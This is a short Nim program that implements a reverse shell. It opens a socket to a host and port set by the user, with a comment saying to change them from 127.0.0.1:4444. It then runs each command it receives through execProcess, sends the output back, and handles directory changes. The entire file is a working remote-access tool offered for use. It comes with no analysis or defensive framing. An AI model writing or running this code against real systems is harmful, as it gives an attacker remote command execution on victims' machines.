import std/net, std/osproc, std/strutils, std/private/ospaths2, std/dirs, std/os

proc reverse_shell(): void =
    try:
        var cd_cond = false
        let socket = newSocket()
        socket.connect("127.0.0.1",  Port(4444)) # change ip and port(if needed)

        while true:
            try:
                let current_dir = getCurrentDir()
                socket.send("Current directory: " & "( " & current_dir & " )" & " ")
                let command = socket.recvLine()
            
                if not isEmptyOrWhitespace(command):

                    if command.startsWith("cd"):
                        let cd_pos: int  = command.find("cd")
                        cd_cond = true 
                        
                        if cd_pos != -1:
                            let start_pos: int = cd_pos + "cd".len() + 1

                            let cd_command = command[start_pos..^1]

                            setCurrentDir(cd_command)
                            

                    let result_command = execProcess(command)

                    if cd_cond:
                        cd_cond = false
                    
                    else:
                        socket.send(result_command)

                    if command == "exit":
                        break
                
            except Exception as e:
                echo e.msg

        defer: socket.close()

    except OSError as e:
        echo e.msg 


reverse_shell()
